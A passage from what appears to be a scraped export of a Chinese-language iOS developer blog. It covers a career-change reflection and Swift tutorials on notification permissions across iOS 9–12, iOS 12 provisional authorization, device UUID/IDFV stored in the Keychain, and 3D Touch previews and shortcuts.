解決問題的道路上你並不孤單時間過得真快，從Back End轉跳開發Mobile iOS APP 滿一年、開始寫Medium也滿一個月，第10篇小小小里程碑就容我寫一篇自我突破轉換跑道心得。永遠保持探索新事物的熱忱「探索的本能促使人類偉大的成就」從古代哥倫布探索海洋發現新大陸、萊特兄弟改良飛機征服天空到現在離開地球探索外太空；唯有對新事物充滿熱忱才能不斷地超越自己，或許我們不能像阿姆斯壯偉大，但是如同他所說的「你的一小步，可能是人的一大步」不要低估自己的創造力才能．契機機會來的時候要好好把握，因為不能保證會有第二次；你可能會猶豫或許下一個更好或懼怕下了錯誤的決定，但是「Who know s ? 是太陽先升起還是意外先來臨 」如果沒有負面的影響那就張開雙手握住機會吧！時間退回到2009年，剛進入彰工綜合高中就讀高一的我，在一次偶然的機會下得知學校有在培訓選手去參加比賽，當初的想法是「反正回家也沒事不如去學學東西」就去報名加入了；是我人生的第一個轉捩點，就此踏入資訊領域；加入選手培訓很辛苦，每天下課+六日+寒暑假三年的時間都在學校練習、風險也很高，沒比到名次就幾乎什麼都沒有；但就結果來說還好當時有把握住這個契機（選手一路走來的心路歷程以後再補上）全國技能競賽 - 勞動部勞動力發展署這個契機讓我學到了很多吃飯的技術，設計的illustrator/Photoshop/Flash、工程的PHP/Mysql/Html/CSS/Javascript/Jquery，並藉由比賽冠軍資格保送臺科大就讀；回頭來看，真的好險，好險有把握這個機會！時間快轉到2017年大學畢業依然是以後端工程師的職務進入職場，對於做網頁這件事，大學開始主要專精於做後端(Laravel)，前端的部分就沒什麼在研究了，都使用現成框架(Bootstrap/Semantic UI)這時的瓶頸是在同個領域太久且一直沒有突破性的發展，所以當初給自己下了新的目標： 繼續深入探索後端 轉換行銷(GA)/企劃領域 學新語言/寫APP這時候契機又出現，我加入的專案要開始開發移動平台應用；但起初我的設定是我去寫API後端，用Laravel加一些新技術對我也算是種突破；這邊要提到一件事，做決定時要把眼光放遠，當初預設選擇繼續後端的原因是惰性加上我覺得踏入的成本很高，因為那時沒有Mac再加上是一個全新的領域，還好有主管的提點，最終還是選擇踏入iOS APP開發．2018年的現在，開發iOS APP剛好滿一年，收穫的部分：學習了新的語言Swift、iOS APP開發、自己寫的APP上架的成就感、開始寫Medium?；還好有把握住這個機會，等於為我的職涯又開了另一扇窗！For工程的後端轉戰iOS APP開發的心得「都是寫程式不都差不多？」隔行如隔山…初期有人指點會比較快，因為很多觀念都跟網頁開發不太ㄧ樣，會經歷一陣子的撞牆期，要撐住！就能看到成功的曙光！我自己也撞牆了快一個月，稍微有脈絡之後你會遇到 第二次撞牆期 ，這時候要越挫越勇，從錯誤中學習，用時間換經驗（如果你時間不夠建議去上入門課或找個師傅帶你） 開發環境 ：以往寫PHP我們用Sublime打一打，Ctrl+S然後Ctrl+Tab切換到瀏覽器Ctrl+R就能快速看到結果；現在要使用Xcode，然後部署到模擬器或手機上才看得到結果；這部分正好能改善我急性子的個性XD． 語言部分 ：Swift比較Morden、強型別、更有結構，一開始可能不太習慣，但用上手後就沒什麼問題了 Storyboard/Interface Builder ：這部分降低新手的入門門檻，如果一開始就要用code刻畫面學習起來會更辛苦；可以直接視覺化玩轉UI、學習排版、拉拉Outlet 記憶體跟頁面排版結構 ：這是比較需要注意的項目，也是我說用時間換經驗的部分；以往做網頁沒有什麼極限，要做什麼就做什麼；就以表格來說，網頁就打&lt;table&gt;然後跑PHP迴圈把資料顯示出來，但在APP上就要使用UITableview元件來實作（想當初用UIView排出來然後很高興跟主管說我做好了！結果發現記憶體一個大爆炸）其他還有記憶體洩漏的部分也要多注意！ 應用上線 ：APP開發要更小心、測試要更細心；因為不像網頁能有錯就改，iOS APP上版本要經過審核、有BUG也不能降版，所以有BUG至少要花一天才能修復，對使用者影響很大！ 使用者評論 ：使用者可給你最直接的評論五顆星暖心、一顆心痛心總結@returntothesources人生就是充滿不確定性才有趣，對於來到的機會，你選擇把握就會有所收穫；你選擇放手，下個機會或許更好，沒有什麼對或錯，總之相信自己的直覺「擇你所愛，愛你所擇」給自己的期許目前還很菜會持續在iOS APP開發上打滾，朝著未來學習、成長尋找突破點、保持寫Medium的習慣，下一個契機是什麼？我也很期待！有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 971 Total Views Last Statistics Date: 2025-01-19 | 962 Views on Medium. " }, { "title": "從 iOS 9 到 iOS 12 推播通知權限狀態處理(Swift)", "url": "/posts/fd7f92d52baa/", "categories": "ZRealm Dev.", "tags": "ios, push-notification, observables, ios-app-development, swift", "date": "2018-11-02 23:23:44 +0800", "snippet": "從 iOS 9 到 iOS 12 推播通知權限狀態處理(Swift)適配 iOS 9 ~ iOS 12 處理通知權限狀態及要求權限的解決方案做什麼？接續前一篇「 什麼？iOS 12 不需使用者授權就能傳送推播通知(Swift) 」提到的推播權限取得流程優化，經過上一篇Murmur部分寫的優化之後又遇到了新的需求： 使用者若關閉通知功能，我們能在特定功能頁面提示他去設定開啟 跳轉至設定頁後...", "content": "從 iOS 9 到 iOS 12 推播通知權限狀態處理(Swift)適配 iOS 9 ~ iOS 12 處理通知權限狀態及要求權限的解決方案做什麼？接續前一篇「 什麼？iOS 12 不需使用者授權就能傳送推播通知(Swift) 」提到的推播權限取得流程優化，經過上一篇Murmur部分寫的優化之後又遇到了新的需求： 使用者若關閉通知功能，我們能在特定功能頁面提示他去設定開啟 跳轉至設定頁後，若有打開/關閉通知的操作，回到APP要能跟著更改狀態 沒詢問過推播權限時詢問權限，有詢問過但是不允許則跳提示，有詢問過又是允許則能繼續操作 iOS 9 ~ iOS 12 都要支援1~3 都還好，使用 iOS 10 之後的Framework UserNotifications 差不多都能妥善的解決，麻煩的是第4項 要能支援 iOS 9，iOS 9要使用 registerUserNotificationSettings 舊的方式處理起來並不容易；就讓我們一步一步做起吧！思路及架構：首先宣告一個全域的 notificationStatus物件 儲存通知權限狀態 並在需要處理的頁面加上屬性監聽（這邊我使用 Observable 做屬性變化的訂閱、可自行找適合的KVO或用Rx、ReactiveCocoa）並在 appDelegate 中 didFinishLaunchingWithOptions (APP初始打開時)、applicationDidBecomeActive (從背景狀態回復時)、didRegisterUserNotificationSettings (≤iOS 9 的推播詢問處理) 這些方法中處理檢查推播通知權限狀態並更改 notificationStatus 的值需要做處理的頁面就會觸發並作相對應的處理（EX: 跳出通知被關閉提示）1. 首先宣告全域 notificationStatus 物件enum NotificationStatusType { case authorized case denied case notDetermined}var notificationStatus: Observable&lt;NotificationStatusType?&gt; = Observable(nil)notificationStatus/NotificationStatusType 的四種狀態分別對應： nil = 物件初始化…檢測中… notDetermined = 未詢問過使用者要不要接收通知 authorized = 已詢問過使用者要不要接收通知且按「允許」 denied = 已詢問過使用者要不要接收通知且按「不允許」2. 構建檢測通知權限狀態的方法：func checkNotificationPermissionStatus() { if #available(iOS 10.0, *) { UNUserNotificationCenter.current().getNotificationSettings { (settings) in DispatchQueue.main.async { //注意！要切回主執行緒 if settings.authorizationStatus == .authorized { //允許 notificationStatus.value = NotificationStatusType.authorized } else if settings.authorizationStatus == .denied { //不允許 notificationStatus.value = NotificationStatusType.denied } else { //沒問過 notificationStatus.value = NotificationStatusType.notDetermined } } } } else { if UIApplication.shared.currentUserNotificationSettings?.types == [] { if let iOS9NotificationIsDetermined = UserDefaults.standard.object(forKey: \"iOS9NotificationIsDetermined\") as? Bool,iOS9NotificationIsDetermined == true { //沒問過 notificationStatus.value = NotificationStatusType.notDetermined } else { //不允許 notificationStatus.value = NotificationStatusType.denied } } else { //允許 notificationStatus.value = NotificationStatusType.authorized } }}以上還沒結束！ 眼尖的朋友應該在≤ iOS 9的判斷之中發現”iOS9NotificationIsDetermined”這個自訂的UserDefaults，那它是用來幹嘛的呢？主因是≤iOS 9的檢測推播權限方法只能用獲取目前的權限有哪些作為判斷，若為空則代表無權限，但在沒詢問過權限的情況下也是會是空白；這時候麻煩就來了，使用者究竟是沒問過還是問過按不允許？這邊我使用了一個自訂的UserDefaults iOS9NotificationIsDetermined作為判斷開關，並在appDelegate的didRegisterUserNotificationSettings中加入：//appdelegate.swift:func application(_ application: UIApplication, didRegister notificationSettings: UIUserNotificationSettings) { //iOS 9(含)以下，跳出詢問要不要允許通知的視窗後，按下允許或不允許都會觸發這個方法 UserDefaults.standard.set(\"iOS9NotificationIsDetermined\", true) checkNotificationPermissionStatus()}通知權限狀態的物件、檢測的方法都構建好後，appDelegate裡我們還要再加上…//appdelegate.swiftfunc application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -&gt; Bool { checkNotificationPermissionStatus() return true}func applicationDidBecomeActive(_ application: UIApplication) { checkNotificationPermissionStatus()}APP初始跟從背景返回都要再檢測一次推播狀態如何以上就是檢測的部分，再來我們來看如果是未詢問該怎麼處理要求通知權限3. 要求通知權限：func requestNotificationPermission() { if #available(iOS 10.0, *) { let permissiones:UNAuthorizationOptions = [.badge, .alert, .sound] UNUserNotificationCenter.current().requestAuthorization(options: permissiones) { (granted, error) in DispatchQueue.main.async { checkNotificationPermissionStatus() } } } else { application.registerUserNotificationSettings(UIUserNotificationSettings(types: [.alert, .badge, .sound], categories: nil)) //前面appdelegate.swift的didRegisterUserNotificationSettings會處理後續callback }}檢測跟要求都處理完囉，我們來看看如何應用4. 應用(靜態)if notificationStatus.value == NotificationStatusType.authorized { //OK!} else if notificationStatus.value == NotificationStatusType.denied { //不允許 //這邊範例是跳出UIAlertController提示並點擊後可跳轉至設定頁面 let alertController = UIAlertController( title: \"親愛的，您目前無法接收通知\", message: \"請開啟結婚吧通知權限。\", preferredStyle: .alert) let settingAction = UIAlertAction( title: \"前往設定\", style: .destructive, handler: { (action: UIAlertAction!) -&gt; Void in if let bundleID = Bundle.main.bundleIdentifier,let url = URL(string:UIApplicationOpenSettingsURLString + bundleID) { UIApplication.shared.openURL(url) } }) let okAction = UIAlertAction( title: \"取消\", style: .default, handler: { (action: UIAlertAction!) -&gt; Void in //well.... }) alertController.addAction(okAction) alertController.addAction(settingAction) self.present(alertController, animated: true) { }} else if notificationStatus.value == NotificationStatusType.notDetermined { //未詢問 requestNotificationPermission()} 請注意！！跳到APP的「設定」頁時請勿使用 UIApplication.shared.openURL(URL(string:”App-Prefs:root=\\ (bundleID)”) ) 方式跳轉， 會被退審! 會被退審! 會被退審! （親身經歷） 這是Private API5. 應用(動態)動態變更狀態的部分，因為notificationStatus物件我們使用是Observable，我們可以在要時時監測狀態的viewDidLoad中加入監聽處理：override func viewDidLoad() { super.viewDidLoad() notificationStatus.afterChange += { oldStatus,newStatus in if newStatus == NotificationStatusType.authorized { //print(\"❤️謝謝你打開通知\") } else if newStatus == NotificationStatusType.denied { //print(\"😭嗚嗚\") } }} 以上只是範例Code，實際應用、觸發可再自行調校 *notificationStatus 使用 Observable 請注意記憶體控制，該釋放時要能釋放（防止記憶體洩漏）、不該釋放時需持有（避免監聽失效）最後附上完整Demo成品：結婚吧APP*由於我們的專案支援範圍是iOS 9 ~ iOS12，iOS 8未進行任何測試不確定支援程度有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 2,626 Total Views Last Statistics Date: 2025-01-19 | 2,592 Views on Medium. " }, { "title": "什麼？iOS 12 不需使用者授權就能收到推播通知(Swift)", "url": "/posts/ade9e745a4bf/", "categories": "ZRealm Dev.", "tags": "ios, swift, push-notification, ios-app-development, ios12", "date": "2018-11-01 23:35:02 +0800", "snippet": "什麼？iOS 12 不需使用者授權就能傳送推播通知(Swift) — (2019–02–06 更新)UserNotifications Provisional Authorization 臨時權限、iOS 12 靜音通知介紹MurMur……前陣子在改善APP推播通知允許及點擊率過低問題，做了些優化調整；最初版的時候體驗非常差，APP 安裝完一啟動就直接跳「APP想要傳送通知」的詢問視窗；想當...", "content": "什麼？iOS 12 不需使用者授權就能傳送推播通知(Swift) — (2019–02–06 更新)UserNotifications Provisional Authorization 臨時權限、iOS 12 靜音通知介紹MurMur……前陣子在改善APP推播通知允許及點擊率過低問題，做了些優化調整；最初版的時候體驗非常差，APP 安裝完一啟動就直接跳「APP想要傳送通知」的詢問視窗；想當然而關閉率非常高，根據前一篇使用 Notification Service Extension 統計通知實際顯示數，推測按允許推播的使用者只有大約10%．目前調整新安裝引導流程、配合介面優化將詢問通知視窗的跳出時機調整如下：結婚吧APP如果使用者還在猶豫或想使用看看再決定要不要接收通知，可按右上角「略過」，避免一開始因對APP還不熟悉而按下「不允許」造成之後也無法再詢問一去不復返的結果。進入正題在做上面這個優化項目時發現 UserNotifications iOS 12 中新增一項 .provisional 權限，翻成白話就是臨時的通知權限， 不用跳詢問通知視窗取得允許通知權限就能對使用者發送推播通知(靜音通知) ，實際效果跟限制我們接著看下去。如何要求臨時通知權限?if #available(iOS 12.0, *) { let center = UNUserNotificationCenter.current() let permissiones:UNAuthorizationOptions = [.badge, .alert, .sound, .provisional] // 可以只要求臨時權限.provisional，或是順便先要求所有要用的權限ＸＤ // 都不會觸發顯示詢問通知視窗 center.requestAuthorization(options: permissiones) { (granted, error) in print(granted) }}我們將以上程式加入 AppDelegate didFinishLaunchingWithOptions 然後開啟APP，就會發現沒有跳出詢問通知視窗；這時我們去 設定 查看 APP通知設定(圖一) 取得靜音通知權限我們就這樣默默地取得了靜音通知權限🏆在程式判斷當前推播通知權限的部分新增 authorizationStatus .provisional 項目 (僅iOS 12之後)：if #available(iOS 10.0, *) { UNUserNotificationCenter.current().getNotificationSettings { (settings) in if settings.authorizationStatus == .authorized { //允許 } else if settings.authorizationStatus == .denied { //不允許 } else if settings.authorizationStatus == .notDetermined { //沒問過 } else if #available(iOS 12.0, *) { if settings.authorizationStatus == .provisional { //目前是臨時權限 } } }} 請注意！ 如果你有針對當前通知權限狀態做判斷， settings.authorizationStatus == .notDetermined 跟 settings.authorizationStatus == .provisional 都是可以再跳出通知詢問視窗問使用者允不允許接收通知的靜音通知能幹嘛？推播如何顯示？先來張圖整理一下靜音通知會顯示的時機：可以看到如果是靜音推播通知，APP在背景狀態下收到通知時 不會跳出橫幅、不會有聲音提示、不能標記、不會出現在鎖定畫面，只會出現在手機解鎖狀態下下拉的通知中心之中 ：可以看到您的發送的推播通知，並且會自動聚合成一個分類點擊展開後使用者可選擇：此展開的詢問視窗只會出現在「臨時權限」時靜音推播之下 要「繼續」接收推播 — 「傳送重要通知」： 通知權限就全開了！通知權限就全開了！通知權限就全開了！ 真的很重要所以講三次，這時候前面程式碼要求權限那段一併要求所有權限的效果就相當顯著了。或維持接收靜音通知 「關閉」 — 「關閉所有通知」點擊後完全關閉推播通知（含靜音通知）。附註：要怎麼手動把現有的APP調成靜音通知？靜音通知是iOS 12對通知優化推出的新設定與臨時權限無關，只不過是程式那端拿到臨時權限就能發靜音通知；針對APP的通知要設成靜音也很簡單，方法之一就是去「設定」-「通知」- 找到APP 將其所有權限都關閉只留「通知中心」(如圖ㄧ)即是靜音通知．或是收到APP通知時重壓/長壓展開後，點擊右上角「…」選擇傳送靜音通知亦同：有了臨時權限在之後觸發跳出詢問通知視窗時：要求通知權限的部分拿掉 .provisional 就能依然正常詢問使用者要不要允許接收通知：if #available(iOS 10.0, *) { let center = UNUserNotificationCenter.current() let permissiones:UNAuthorizationOptions = [.badge, .alert, .sound] center.requestAuthorization(options: permissiones) { (granted, error) in print(granted) }}按「允許」取得所有通知權限、按「不允許」關閉所有通知權限(含本來取得的靜音通知權限)整體流程如下：總結：iOS 12的這項通知貼心優化，讓使用者跟開發者之間對通知功能更容易達搭起互動的橋樑，能盡量避免一去不復返關閉通知的狀況。對使用者來說，往往跳詢問通知視窗時不知該按下允許還是拒絕因為我們不知道開發者會傳什麼樣的通知給我們，可能是廣告亦可能是重要消息，未知的事物是可怕的，所以大部分的人都會先保守按下拒絕。對開發者來說，我們精心準備了許多項目包含重要消息要推送給使用者知道，但就因上述問題而被使用者屏蔽，我們花費心思設計的文案就這樣白費了！此功能可讓開發者把握使用者剛安裝APP時的機會，設計好推播流程、內容，對使用者優先推送感興趣項目，增加使用者對此APP通知的認識度，並追蹤推播點擊率，在適當的時機再觸發詢問使用者要不要接收通知。雖然能曝光的地方只有 通知中心 但有曝光有機會；換個角度想，我們是使用者的話，沒按允許通知，APP如果能傳一堆有橫幅+有聲音+還出現在解鎖畫面的通知給我，應該會覺得非常干擾惱人(隔壁陣營就是XD)，蘋果這個做法則是在使用者與開發者之間取得了平衡。目前的問題大概就是….iOS 12的用戶還太少🤐2019–02–06 更新實際應用： 實際應用我已「取消」實作此功能為什麼？因為發現在以下情況使用者會被動進入靜音推播模式，要自行手動把所有推播權限(橫幅、聲音、標記)打開有點尷尬，也就是說使用者如果再詢問通知權限時按否，到設定再打開，那個打開的會只有靜音通知權限；要再請使用者把下方橫幅、聲音、標記都打開有點困難，所以暫時就先取消不使用了。延伸閱讀 從 iOS 9 到 iOS 12 推播通知權限狀態處理(Swift) iOS Deferred Deep Link 延遲深度連結實作(Swift) iOS+MacOS 使用mitmproxy 進行中間人嗅探 iOS 15 / MacOS Monterey Safari 將能隱藏真實 IP有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 2,913 Total Views Last Statistics Date: 2025-01-19 | 2,899 Views on Medium. " }, { "title": "iOS UUID 的那些事 (Swift/iOS ≥ 6)", "url": "/posts/a4bc3bce7513/", "categories": "ZRealm Dev.", "tags": "iplayground, swift, ios-app-development, uuid, idfv", "date": "2018-10-25 22:26:20 +0800", "snippet": "iOS UUID 的那些事 (Swift/iOS ≥ 6)iPlayground 2018 回來 &amp; UUID那些事前言：上週六、日跑去參加 iPlayground Apple 軟體開發者研討會，這個活動訊息是同事PASS過來的，去之前我也不清楚這個活動。兩天下來，整題活動跟時程安排流暢，議程內容： 趣味的：腳踏車、凋零的Code、iOS/API 演進史、威利在哪裡(CoreML ...", "content": "iOS UUID 的那些事 (Swift/iOS ≥ 6)iPlayground 2018 回來 &amp; UUID那些事前言：上週六、日跑去參加 iPlayground Apple 軟體開發者研討會，這個活動訊息是同事PASS過來的，去之前我也不清楚這個活動。兩天下來，整題活動跟時程安排流暢，議程內容： 趣味的：腳踏車、凋零的Code、iOS/API 演進史、威利在哪裡(CoreML Vision) 實用的：測試類 (XCUITest、依賴注入)、SpriteKit 做動畫效果的替代方案、GraphQL 真功夫：深入拆解Swift、iOS 越獄/Tweak開發、Redux腳踏車Project 印象深刻，用iPhone手機當感測器感測腳踏車踏板轉動，直接在台上騎腳踏車切換投影片(前輩主要目標是要做開源版zwift，也分享了許多地雷，例如Client/Sever通信、延遲問題、磁場干擾)凋零的Dirty Code；聽得心有戚戚，在心裡會心一笑；技術債就是這樣一直累積下來的，開發時程趕，所以用架構性較差的快速做法，後人接手改也沒時間重構，就越積越多；到最後可能真的只有打掉這條路了測試類(Design Patterns in XCUITest) KKBOX的前輩 ，完全沒藏私直接公開他們的作法及程式範例細節還有遇到的雷、解決辦法，這堂也是對我們工作上最有幫助的項目；測試這塊是我一直想加強的部分，可以回去好好研究研究Lighting Talk的部分在台下聽得也好想上去分享😂 下次要提早做好準備了!會後的offical party，酒水食物場地都很有誠意，聽前輩們的真心話吐露，很輕鬆有趣之外還吸收許多職場軟實力．台大後台咖啡我才知道原來這是第一屆，真的有榮幸能夠參加，所有工作人員跟講者辛苦了！去參加研討會的目的不外乎就是要： 增加廣度 ，吸收新知、了解生態、碰一些平常不會接觸的項目跟 增加深度 ，如果是自己已經摸過的項目就是去聽聽看有沒有遺漏的地方或是還有其他做法沒發現．抄了許多筆記可以回來慢慢研究回味。UUID的那些事因為我聽完回去後馬上實際應用到APP上；這堂是由Zonble前輩主講，我聽到從iPhone OS 2寫到iOS 12我就跪了；由於入行較晚，我是從iOS 11/Swift 4 才開始寫，所以沒碰到那些因為蘋果修改API的動亂時期。想想UUID從可以取得到封鎖也是蠻合理的；如果是用在良善的地方：辨識使用者裝置、廣告或第三方運用唯一性去做廣告操作；但如果有廠商想做惡，也可以透過這個機制反查，知道你這隻手機的主人是怎麼樣的人？(例如有裝旅遊+台北等公車＋BMW APP+嬰兒照護 就能推測你很常出國家裡有小孩而且住在台北 之類的資訊)再加上你在APP上輸入的個資，能拿去做什麼應用不敢想像但這其中也波及到很多正當守法的用戶，像是本來用UUID當使用者的資料解密KEY或用UUID當裝置判斷都受到很大的影響；真佩服那個時期的工程師前輩們，這些影響老闆跟使用者一定會狂罵，要急中生智找其他替代辦法．替代方案：本篇文章以取得UUID辨識裝置唯一值為主，如果是要找知道使用者裝了哪些APP的替代方案可參考以下關鍵字搜尋做法： UIPasteboard pasteboardWithName: create: (運用剪貼簿在APP間共享) 、canOpenURL: info.plist LSApplicationQueriesSchmes (運用canOpenURL檢查APO有無安裝，要在info.plist列舉，最多50筆) 用MAC Address當UUID，但後來也被BAN了 Finger Printing (Canvas/User-Agent…) ：沒研究，不過這項目主要拿來讓safari跟app能產生同樣的UUID， Deferred Deep Linking (延遲深度連結)用AmIUnique? ID entifier F or V endor (IDFV)：目前主流的解決方案🏆概念是蘋果會根據你的Bundle ID前輟為使用者產生UUID，相同的Bundle ID前輟會產生相同的UUID，例如:com.518.work/com.518.job 同個裝置會得到相同的UUID如同原文ID For Vendor，相同的前輟蘋果認為即是相同廠商的APP，所以共享UUID是允許的。ID entifier F or V endor (IDFV)：let DEVICE_UUID:String = UIDevice.current.identifierForVendor?.uuidString ?? UUID().uuidString唯需注意：當所有同Vendor的APP都移除後再重裝就會產生新的UUID ( com.518.work跟com.518.job都被刪除，再裝回com.518.work這時就會產生新的UUID ) 同理如果你只有一個APP，刪掉重裝就會產生新的UUID因為這個特性，我們公司的其他APP是使用Key-Chain來解決這個問題，聽了講者前輩的指點也驗證了這個做法是正確的！流程如下：Key-Chain UUID欄位有值時取值，無則取IDFA的UUID值並回寫Key-Chain 寫入方式：if let data = DEVICE_UUID.data(using: .utf8) { let query = [ kSecClass as String : kSecClassGenericPassword as String, kSecAttrAccount as String : \"DEVICE_UUID\", kSecValueData as String : data ] as [String : Any] SecItemDelete(query as CFDictionary) SecItemAdd(query as CFDictionary, nil)}Key-Chain 讀取方式：let query = [ kSecClass as String : kSecClassGenericPassword, kSecAttrAccount as String : \"DEVICE_UUID\", kSecReturnData as String : kCFBooleanTrue, kSecMatchLimit as String : kSecMatchLimitOne ] as [String : Any]var dataTypeRef: AnyObject? = nillet status: OSStatus = SecItemCopyMatching(query as CFDictionary, &amp;dataTypeRef)if status == noErr,let dataTypeRef = dataTypeRef as? Data,let uuid = String(data:dataTypeRef, encoding: .utf8) { //uuid} 如果嫌 Key-Chain 操作太繁瑣可以自行封裝或使用第三方套件。完整CODE：let DEVICE_UUID:String = { let query = [ kSecClass as String : kSecClassGenericPassword, kSecAttrAccount as String : \"DEVICE_UUID\", kSecReturnData as String : kCFBooleanTrue, kSecMatchLimit as String : kSecMatchLimitOne ] as [String : Any] var dataTypeRef: AnyObject? = nil let status: OSStatus = SecItemCopyMatching(query as CFDictionary, &amp;dataTypeRef) if status == noErr,let dataTypeRef = dataTypeRef as? Data,let uuid = String(data:dataTypeRef, encoding: .utf8) { return uuid } else { let DEVICE_UUID:String = UIDevice.current.identifierForVendor?.uuidString ?? UUID().uuidString if let data = DEVICE_UUID.data(using: .utf8) { let query = [ kSecClass as String : kSecClassGenericPassword as String, kSecAttrAccount as String : \"DEVICE_UUID\", kSecValueData as String : data ] as [String : Any] SecItemDelete(query as CFDictionary) SecItemAdd(query as CFDictionary, nil) } return DEVICE_UUID }}()因為我在其他Extension Target也需要參照所以直接包成一個閉包參數使用有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 4,455 Total Views Last Statistics Date: 2025-01-19 | 4,423 Views on Medium. " }, { "title": "提升使用者體驗，現在就為您的 iOS APP 加上 3D TOUCH 功能(Swift)", "url": "/posts/1ca246e27273/", "categories": "ZRealm Dev.", "tags": "ios, swift, 3d-touch, iphone, ios-app-development", "date": "2018-10-18 22:36:57 +0800", "snippet": "[Deprecated]提升使用者體驗，現在就為您的 iOS APP 加上 3D TOUCH 功能(Swift)iOS 3D TOUCH 應用[Deprecated] 2020/06/14 iPhone 11 以上版本已取消 3D Touch 功能；改用 Haptic Touch 取代，實作方式也有所不同。前陣子在專案開發閒暇之時，探索了許多 iOS 的有趣功能： CoreML 、 Vis...", "content": "[Deprecated]提升使用者體驗，現在就為您的 iOS APP 加上 3D TOUCH 功能(Swift)iOS 3D TOUCH 應用[Deprecated] 2020/06/14 iPhone 11 以上版本已取消 3D Touch 功能；改用 Haptic Touch 取代，實作方式也有所不同。前陣子在專案開發閒暇之時，探索了許多 iOS 的有趣功能： CoreML 、 Vision 、 Notification Service Extension 、Notification Content Extension、Today Extension、Core Spotlight、Share Extension、SiriKit (部分已整理成文章、其他項目敬請期待🤣)其中還有今日的主角： 3D Touch功能這個早在 iOS 9/iPhone 7之後 就開始支援的功能，直到我自己從iPhone 6換到iPhone 8 後才體會到它的好用之處！3D Touch能在APP中實做兩個項目，如下：1. Preview ViewController 預覽功能 — 結婚吧APP2. 3D Touch Shortcut APP 捷徑啟動功能其中第一項是應用最廣且效果最好的 (Facebook:動態消息內容預覽、Line:偷看訊息)，第二項 APP 捷徑啟動 目前看數據是鮮少人使用所以放最後在講。1. Preview ViewController 預覽功能：功能展示如上圖1所示，ViewController 預覽功能支援 3D Touch重壓時背景虛化 3D Touch重壓住時跳出ViewController預覽視窗 3D Touch重壓住時跳出ViewController預覽視窗，往上滑可在下方加入選項選單 3D Touch重壓放開返回視窗 3D Touch重壓後再用力進入目標ViewController這裡將分 A:列表視窗 、 B:目標視窗 個別列出要實作的程式碼：由於在 B中 沒有方式能判斷當前是預覽還是真的進入此視窗，所以我們先建立一個Protocol傳遞值，用來判斷protocol UIViewControllerPreviewable { var is3DTouchPreview:Bool {get set}}這樣我們就能在 B中 做以下判斷：class BViewController:UIViewController, UIViewControllerPreviewable { var is3DTouchPreview:Bool = false override func viewDidLoad() { super.viewDidLoad() if is3DTouchPreview { //若為預覽視窗時...例如：變全螢幕、隱藏工具列 } else { //完整模式時照正常顯示 } }A:列表視窗，可以是 UITableView 或 UICollectionView：class AViewController:UIViewController { //註冊能3D Touch 的 View override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) { super.traitCollectionDidChange(previousTraitCollection) if traitCollection.forceTouchCapability == .available { //TableView: registerForPreviewing(with: self, sourceView: self.TableView) //CollectionView: registerForPreviewing(with: self, sourceView: self.CollectionView) } } }extension AViewController: UIViewControllerPreviewingDelegate { //3D Touch放開後，要做的處理 func previewingContext(_ previewingContext: UIViewControllerPreviewing, commit viewControllerToCommit: UIViewController) { //現在要直接跳轉的該頁面了，所以將ViewController的預覽模式參數取消： if var viewControllerToCommit = viewControllerToCommit as? UIViewControllerPreviewable { viewControllerToCommit.is3DTouchPreview = false } self.navigationController?.pushViewController(viewControllerToCommit, animated: true) } //控制3D Touch的Cell位置，欲顯示的ViewController func previewingContext(_ previewingContext: UIViewControllerPreviewing, viewControllerForLocation location: CGPoint) -&gt; UIViewController? { //取得當前點的indexPath/cell實體 //TableView: guard let indexPath = TableView.indexPathForRow(at: location),let cell = TableView.cellForRow(at: indexPath) else { return nil } //CollectionView: guard let indexPath = CollectionView.indexPathForItem(at: location),let cell = CollectionView.cellForItem(at: indexPath) else { return nil } //欲顯示的ViewController let targetViewController = UIStoryboard(name: \"StoryboardName\", bundle: nil).instantiateViewController(withIdentifier: \"ViewControllerIdentifier\") //背景虛化時保留區域(一般為點擊位置)，附圖1 previewingContext.sourceRect = cell.frame //3D Touch視窗大小，預設為自適應，不需更改 //要修改請用：targetViewController.preferredContentSize = CGSize(width: 0.0, height: 0.0) //告知預覽的ViewController目前為預覽模式： if var targetViewController = targetViewController as? UIViewControllerPreviewable { targetViewController.is3DTouchPreview = true } //回傳nil則無任何作用 return nil }} 請注意！其中的註冊能3D Touch 的 View 這塊要放在 traitCollectionDidChange 之中而非 “viewDidLoad” ( 請參考此篇內容 ) 關於要加放在哪裡這塊我踩了許多雷，網路有些資料寫viewDidLoad、有的寫在cellforItem中，但這兩個地方都會出現偶爾失效或部分cell失效的問題。附圖1 背景虛化保留區示意圖如果您需要上滑後在下方加入選項選單請在 B 之中加入，是B 是B 是B哦！override var previewActionItems: [UIPreviewActionItem] { let profileAction = UIPreviewAction(title: \"查看商家資訊\", style: .default) { (action, viewController) -&gt; Void in //點擊後的操作 } return [profileAction]}回傳空陣列表示不使用此功能。完成！2. APP 捷徑啟動第一步在 info.plist 中加入 UIApplicationShortcutItems 參數，類型 Array並在其中新增選單項目(Dictionary)，其中Key-Value的設定對應如下： [必填] UIApplicationShortcutItemType : 識別字串，在AppDelegate中做判斷使用 [必填] UIApplicationShortcutItemTitle : 選項標題 UIApplicationShortcutItemSubtitle : 選項子標題 UIApplicationShortcutItemIconType : 使用系統圖標參考自 此篇文章 UIApplicationShortcutItemIconFile : 使用自定義圖標(size:35x35,單色)，與UIApplicationShortcutItemIconType擇ㄧ使用 UIApplicationShortcutItemUserInfo : 更多附加資訊EX: [id:1]我的設定如上圖第二步在AppDelegate中新增處理的 Functionfunc application(_ application: UIApplication, performActionFor shortcutItem: UIApplicationShortcutItem, completionHandler: @escaping (Bool) -&gt; Void) { var info = shortcutItem.userInfo switch shortcutItem.type { case \"searchShop\": // case \"topicList\": // case \"likeWorksPic\": // case \"marrybarList\": // default: break } completionHandler(true)}完成！結語在APP中加入 3D Touch的功能並不難，對使用者來說也會覺得很貼心❤；可以搭配設計操作增加使用者體驗；但目前就只有上述兩個功能可做在加上iPhone 6s以下/iPad/iPhone XR都不支援3D 